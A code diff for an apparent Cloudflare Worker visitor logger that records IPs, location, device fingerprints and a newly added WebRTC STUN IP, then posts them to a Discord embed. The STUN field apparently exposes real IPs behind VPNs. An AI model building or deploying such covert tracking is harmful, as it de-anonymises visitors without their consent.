@@ -15,7 +15,7 @@ export default {
     }
 
     const ip = request.headers.get("CF-Connecting-IP") || "Unknown";
-    const source = request.headers.get("Origin") || "abgache.ink";
+    const source = request.headers.get("Origin") || "Unknown Source";
     const ua = request.headers.get("user-agent") || "Unknown";
     const now = new Date();
     const formattedDate = now.toLocaleString("fr-FR", { timeZone: "Europe/Paris" });
@@ -63,6 +63,7 @@ export default {
     const memoryGB = deviceInfo.memoryGB || "Unknown";
     const screenResolution = deviceInfo.screenResolution || "Unknown";
     const viewport = deviceInfo.viewport || "Unknown";
+    const stun_ip = deviceInfo.stun_ip || "Unknown";
     let source_link = deviceInfo.source_deviceInfo || "Unknown";
     if (source_link==="tk"){
       source_link = "[Tiktok](https://tiktok.com/)";}
@@ -92,7 +93,7 @@ export default {
       source_link = "[LinkedIn](https://linkedin.com/)";}
 
     await env.LOGS.put(key, JSON.stringify({ 
-      ip, time: formattedDate, source, country, city, asn, asOrg, ua,
+      ip, stun_ip, time: formattedDate, source, country, city, asn, asOrg, ua,
       platform, os, device, browser, timezone, gpu, language, cores, memoryGB, screenResolution, viewport
     }));
 
@@ -107,6 +108,7 @@ export default {
             title: "📌 New activity in the website",
             color: 918770,
             description: `-# Made by [abgache](https://abgache.ink/)\n- **IP :** \`${ip}\`
+- **WebRTC STUN IP :** \`${stun_ip}\`
 - **Hour :** ${formattedDate}
 - **Source :** \`${source}\`
 - **Country :** ${country}
